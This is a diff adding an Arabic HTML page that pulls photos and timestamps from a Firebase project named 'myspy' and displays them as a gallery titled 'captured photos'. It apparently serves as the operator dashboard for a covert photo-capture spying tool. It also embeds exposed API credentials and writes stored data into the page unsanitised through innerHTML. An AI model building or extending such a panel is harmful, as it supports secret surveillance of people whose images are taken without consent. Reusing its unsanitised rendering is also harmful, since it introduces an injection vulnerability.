@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>استوديو الصور - عبد الرحمن</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #111; color: white; font-family: sans-serif; text-align: center; }
+        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; padding: 20px; }
+        .photo-card { border: 2px solid #444; padding: 5px; border-radius: 10px; background: #222; }
+        img { width: 300px; border-radius: 8px; display: block; }
+        p { font-size: 12px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>📸 الصور المسحوبة</h1>
+    <div class="gallery" id="gallery"></div>
+
+    <script>
+        const firebaseConfig = {
+          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
+          authDomain: "myspy-2579b.firebaseapp.com",
+          projectId: "myspy-2579b",
+          storageBucket: "myspy-2579b.firebasestorage.app",
+          messagingSenderId: "487846863334",
+          appId: "1:487846863334:web:b58620e6f34d187e02b627"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // سحب الصور من قسم results
+        db.ref('results').on('child_added', (snap) => {
+            const data = snap.val();
+            const div = document.createElement('div');
+            div.className = 'photo-card';
+            div.innerHTML = `<img src="${data.photo}"><p>${data.date}</p>`;
+            document.getElementById('gallery').prepend(div); // يحط أحدث صورة في الأول
+        });
+    </script>
+</body>
+</html>
